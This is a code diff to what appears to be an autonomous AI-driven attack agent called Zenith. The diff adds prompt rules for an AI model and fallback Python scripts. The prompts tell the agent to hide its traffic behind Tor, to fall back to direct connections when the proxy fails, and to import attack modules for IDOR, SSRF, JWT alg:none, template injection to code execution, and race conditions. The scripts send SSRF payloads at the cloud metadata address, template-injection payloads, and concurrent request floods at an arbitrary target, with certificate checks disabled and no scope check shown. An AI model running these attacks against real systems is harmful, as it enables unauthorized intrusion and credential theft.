@@ -243,6 +243,18 @@ RULES:
 5. NEVER add proxychains/torsocks. Proxy is automatic.
 6. If a tool is "not found", use pure Python instead (socket, urllib, requests).
 7. Each script should do ONE focused task and print clear results.
+8. If output says "PROXY IS DOWN" or "Connection refused through proxy" → the proxy is broken. Use DNS tools (dig, host via subprocess) that bypass proxy. The system will auto-disable proxy after 3 failures.
+9. If output says "Proxy has been AUTO-DISABLED" → great, retry your HTTP approach with direct connections.
+
+=== ADVANCED ATTACK MODULES (import and use in your scripts!) ===
+from zenith.modules.idor_scanner import IDORScanner  # IDOR/BOLA testing - #1 bug bounty finding
+from zenith.modules.ssrf_scanner import SSRFScanner  # SSRF - cloud metadata, internal services
+from zenith.modules.jwt_attacks import JWTAttacker    # JWT alg:none, weak secret, kid injection
+from zenith.modules.ssti_scanner import SSTIScanner   # SSTI - Jinja2, Twig, Freemarker → RCE
+from zenith.modules.race_condition import RaceConditionTester  # Race conditions, double-spend
+
+Usage example: scanner = IDORScanner('{target}'); results = scanner.scan()
+Each module auto-discovers endpoints, tests payloads, and prints structured results.
 
 CRITICAL: Output ONLY raw JSON. No markdown, no ``` blocks.
 
@@ -285,7 +297,9 @@ Output:
 6. To use external tools like nmap, call them via subprocess.run() in your Python script.
 7. NEVER add proxychains/torsocks. Proxy is handled automatically.
 8. If a tool says "not found", use pure Python (socket, urllib) instead.
-9. If connection refused → switch to passive OSINT (crt.sh, wayback, whois via Python).
+9. If connection refused through PROXY → the proxy/Tor is DOWN, not the target. Use DNS tools (dig, host via subprocess) that bypass proxy. System auto-disables proxy after 3 failures.
+10. If output says "Proxy has been AUTO-DISABLED" → retry your HTTP approach, it will now use direct connections.
+11. If connection refused WITHOUT proxy → target is blocking. Switch to passive OSINT (crt.sh, wayback, whois via Python).
 10. Each script = ONE focused task. Print clear, structured results.
 
 === AVAILABLE TOOLS (call via subprocess from Python) ===
@@ -301,6 +315,37 @@ GOAL ACHIEVED (when scan is complete):
 
 PHASE SWITCH:
 {{"reasoning":"Why switching phase","action":"SWITCH_PHASE","new_phase":"scan","phase":"scan"}}
+
+=== ADVANCED ATTACK MODULES (import in your Python scripts!) ===
+Zenith has built-in advanced security modules. Import and use them in your scripts:
+
+1. IDOR Scanner (Insecure Direct Object Reference):
+   from zenith.modules.idor_scanner import IDORScanner
+   scanner = IDORScanner('{target}')
+   results = scanner.scan()  # Auto-discovers API endpoints and tests ID manipulation
+
+2. SSRF Scanner (Server-Side Request Forgery):
+   from zenith.modules.ssrf_scanner import SSRFScanner
+   scanner = SSRFScanner('{target}')
+   results = scanner.scan()  # Tests AWS metadata, localhost, internal services
+
+3. JWT Attacker (JSON Web Token Attacks):
+   from zenith.modules.jwt_attacks import JWTAttacker
+   attacker = JWTAttacker('{target}')
+   results = attacker.scan()  # Tests alg:none, weak secrets, kid injection
+
+4. SSTI Scanner (Server-Side Template Injection → RCE):
+   from zenith.modules.ssti_scanner import SSTIScanner
+   scanner = SSTIScanner('{target}')
+   results = scanner.scan()  # Tests Jinja2, Twig, Freemarker, ERB, etc.
+
+5. Race Condition Tester:
+   from zenith.modules.race_condition import RaceConditionTester
+   tester = RaceConditionTester('{target}')
+   results = tester.scan()  # Tests double-spend, coupon reuse, rate limits
+
+All modules accept optional cookies='...' and headers={{...}} parameters.
+Use these for deep vulnerability testing - they are more thorough than manual scripts.
 
 === ADVANCED SCRIPT TIPS ===
 - Use concurrent.futures.ThreadPoolExecutor for fast parallel scanning
@@ -611,6 +656,37 @@ PHASE SWITCH:
                 "action": "SCRIPT", "script_type": "python",
                 "script": f"import urllib.request, ssl, urllib.parse\nctx=ssl._create_unverified_context()\ntarget='{target}'\nprint(f'=== XSS Reflection Scanner: {{target}} ===')\ncanary='z3n1th7357'\ntest_params=['q','search','query','s','keyword','name','user','input','text','url','redirect','next','return','callback','ref']\nfor param in test_params:\n    url=f'https://{{target}}/?{{param}}={{canary}}'\n    try:\n        req=urllib.request.Request(url,headers={{'User-Agent':'Mozilla/5.0'}})\n        r=urllib.request.urlopen(req,context=ctx,timeout=5)\n        body=r.read(50000).decode(errors='ignore')\n        if canary in body:\n            count=body.count(canary)\n            print(f'⚠ REFLECTED: ?{{param}}={{canary}} ({{count}}x in response)')\n            # Check if it's in a dangerous context\n            import re\n            if re.search(f'<[^>]*{{canary}}',body): print(f'  → Inside HTML tag!')\n            if re.search(f'\"[^\"]*{{canary}}',body): print(f'  → Inside attribute!')\n            if re.search(f'<script[^>]*>[^<]*{{canary}}',body): print(f'  → Inside <script>!')\n    except: pass\nprint('XSS reflection scan complete.')",
                 "phase": phase, "expected_outcome": "Parameters reflecting input - potential XSS vectors."
+            },
+            # ── Advanced Module-Based Fallbacks ──
+            {
+                "reasoning": f"{reason} - running IDOR/BOLA Scanner module (top bug bounty finding).",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import sys, os\nsys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath('.'))))\ntry:\n    from zenith.modules.idor_scanner import IDORScanner\n    scanner = IDORScanner('{target}')\n    results = scanner.scan()\n    if results:\n        print(f'\\n⚠ TOTAL IDOR FINDINGS: {{len(results)}}')\n        for r in results:\n            print(f'  [{{r.get(\"severity\",\"?\")}}] {{r.get(\"type\",\"\")}}: {{r.get(\"detail\",\"\")}}')\n    else:\n        print('No IDOR vulnerabilities found.')\nexcept ImportError:\n    print('Module import failed, running inline IDOR test...')\n    import urllib.request, ssl\n    ctx=ssl._create_unverified_context()\n    target='{target}'\n    for path in ['/api/v1/users/1','/api/v1/users/2','/api/user/1','/api/user/2','/api/account/1','/user/1','/profile/1']:\n        try:\n            r=urllib.request.urlopen(f'https://{{target}}{{path}}',context=ctx,timeout=5)\n            print(f'[{{r.status}}] {{path}} ({{r.length}}b)')\n        except Exception as e: print(f'[ERR] {{path}}: {{e}}')",
+                "phase": phase, "expected_outcome": "IDOR/BOLA vulnerabilities via automatic ID manipulation."
+            },
+            {
+                "reasoning": f"{reason} - running SSRF Scanner module (cloud metadata, internal services).",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import sys, os\nsys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath('.'))))\ntry:\n    from zenith.modules.ssrf_scanner import SSRFScanner\n    scanner = SSRFScanner('{target}')\n    results = scanner.scan()\n    if results:\n        print(f'\\n⚠ TOTAL SSRF FINDINGS: {{len(results)}}')\n        for r in results:\n            print(f'  [{{r.get(\"severity\",\"?\")}}] {{r.get(\"type\",\"\")}}: {{r.get(\"detail\",\"\")}}')\n    else:\n        print('No SSRF vulnerabilities found.')\nexcept ImportError:\n    print('Module import failed, running inline SSRF test...')\n    import urllib.request, ssl\n    ctx=ssl._create_unverified_context()\n    target='{target}'\n    ssrf_params=['url','uri','link','redirect','callback','fetch','load','proxy']\n    for param in ssrf_params:\n        for payload in ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/']:\n            try:\n                r=urllib.request.urlopen(f'https://{{target}}/?{{param}}={{payload}}',context=ctx,timeout=5)\n                body=r.read(500).decode(errors='ignore')\n                if any(w in body for w in ['ami-id','instance','root:']): print(f'⚠ SSRF: ?{{param}}={{payload}}')\n            except: pass",
+                "phase": phase, "expected_outcome": "SSRF vulnerabilities via cloud metadata and internal service probing."
+            },
+            {
+                "reasoning": f"{reason} - running JWT Attack module (alg:none, weak secrets).",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import sys, os\nsys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath('.'))))\ntry:\n    from zenith.modules.jwt_attacks import JWTAttacker\n    attacker = JWTAttacker('{target}')\n    results = attacker.scan()\n    if results:\n        print(f'\\n⚠ TOTAL JWT FINDINGS: {{len(results)}}')\n        for r in results:\n            print(f'  [{{r.get(\"severity\",\"?\")}}] {{r.get(\"type\",\"\")}}: {{r.get(\"detail\",\"\")}}')\n    else:\n        print('No JWT vulnerabilities found.')\nexcept ImportError:\n    print('Module import failed, running inline JWT check...')\n    import urllib.request, ssl, re\n    ctx=ssl._create_unverified_context()\n    target='{target}'\n    print(f'=== JWT Discovery: {{target}} ===')\n    for path in ['/','/api/auth/login','/login','/api/token']:\n        try:\n            r=urllib.request.urlopen(f'https://{{target}}{{path}}',context=ctx,timeout=5)\n            body=r.read(50000).decode(errors='ignore')\n            tokens=re.findall(r'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]*',body)\n            if tokens: print(f'JWT found at {{path}}: {{tokens[0][:60]}}...')\n        except: pass",
+                "phase": phase, "expected_outcome": "JWT vulnerabilities - alg:none bypass, weak secrets, forged tokens."
+            },
+            {
+                "reasoning": f"{reason} - running SSTI Scanner module (template injection → RCE).",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import sys, os\nsys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath('.'))))\ntry:\n    from zenith.modules.ssti_scanner import SSTIScanner\n    scanner = SSTIScanner('{target}')\n    results = scanner.scan()\n    if results:\n        print(f'\\n⚠ TOTAL SSTI FINDINGS: {{len(results)}}')\n        for r in results:\n            print(f'  [{{r.get(\"severity\",\"?\")}}] {{r.get(\"type\",\"\")}}: {{r.get(\"detail\",\"\")}}')\n    else:\n        print('No SSTI vulnerabilities found.')\nexcept ImportError:\n    print('Module import failed, running inline SSTI test...')\n    import urllib.request, ssl, urllib.parse\n    ctx=ssl._create_unverified_context()\n    target='{target}'\n    payloads=[('{{{{7*7}}}}','49'),('${{7*7}}','49'),('<%= 7*7 %>','49')]\n    params=['name','q','search','template','text','message','input']\n    for param in params:\n        for payload,expected in payloads:\n            try:\n                url=f'https://{{target}}/?{{param}}={{urllib.parse.quote(payload)}}'\n                r=urllib.request.urlopen(url,context=ctx,timeout=5)\n                body=r.read(50000).decode(errors='ignore')\n                if expected in body and payload not in body: print(f'⚠ SSTI: ?{{param}} with {{payload}} → {{expected}}')\n            except: pass",
+                "phase": phase, "expected_outcome": "SSTI vulnerabilities - template injection leading to RCE."
+            },
+            {
+                "reasoning": f"{reason} - running Race Condition Tester module (double-spend, rate limit bypass).",
+                "action": "SCRIPT", "script_type": "python",
+                "script": f"import sys, os\nsys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath('.'))))\ntry:\n    from zenith.modules.race_condition import RaceConditionTester\n    tester = RaceConditionTester('{target}')\n    results = tester.scan()\n    if results:\n        print(f'\\n⚠ TOTAL RACE CONDITION FINDINGS: {{len(results)}}')\n        for r in results:\n            print(f'  [{{r.get(\"severity\",\"?\")}}] {{r.get(\"type\",\"\")}}: {{r.get(\"detail\",\"\")}}')\n    else:\n        print('No race condition vulnerabilities found.')\nexcept ImportError:\n    print('Module import failed, running inline rate limit test...')\n    import urllib.request, ssl, concurrent.futures, time\n    ctx=ssl._create_unverified_context()\n    target='{target}'\n    print(f'=== Rate Limit Test: {{target}} ===')\n    def fire(i):\n        try:\n            r=urllib.request.urlopen(f'https://{{target}}/',context=ctx,timeout=5)\n            return r.status\n        except: return 0\n    with concurrent.futures.ThreadPoolExecutor(20) as ex:\n        results=list(ex.map(fire,range(30)))\n    success=sum(1 for r in results if r==200)\n    print(f'Concurrent test: {{success}}/30 requests succeeded')\n    if success>=25: print('⚠ No rate limiting detected!')",
+                "phase": phase, "expected_outcome": "Race conditions, double-spend, rate limit bypass."
             },
         ]
         # Rotate through options sequentially to avoid duplicates
